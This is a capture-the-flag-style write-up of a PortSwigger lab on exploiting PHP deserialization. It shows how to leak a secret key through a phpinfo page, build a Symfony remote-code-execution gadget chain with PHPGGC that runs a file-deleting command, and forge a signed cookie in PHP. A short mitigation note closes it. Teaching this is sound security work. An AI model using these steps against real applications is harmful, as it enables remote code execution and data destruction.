# Lab 04 — Exploiting PHP deserialization with a pre-built gadget chain

> **Expert** · [Official lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)

**Entry point:** the session cookie is `{"token": <serialized>, "sig_hmac_sha1": ...}`
— signed, but the signing key leaks via a debug page.

## Solution

1. Log in (`wiener:peter`); decode the cookie — a serialized PHP object with
   an SHA-1 HMAC signature.
2. Tamper with it: the error page leaks **Symfony 4.3.6** and a debug file
   `/cgi-bin/phpinfo.php`.
3. Request `/cgi-bin/phpinfo.php` — the response exposes the
   `SECRET_KEY` environment variable.
4. Generate a Symfony gadget chain with **PHPGGC**:

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64-w
```

5. Sign the payload with the leaked key:

```php
<?php
$object = "OUTPUT-FROM-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

6. Replace the session cookie with the signed malicious one and send any
   request — the chain executes — lab solved.

## Mitigation

Rotate leaked secrets; never expose phpinfo; sign-then-encrypt beats
sign-only, and unserializing nothing beats all of it.
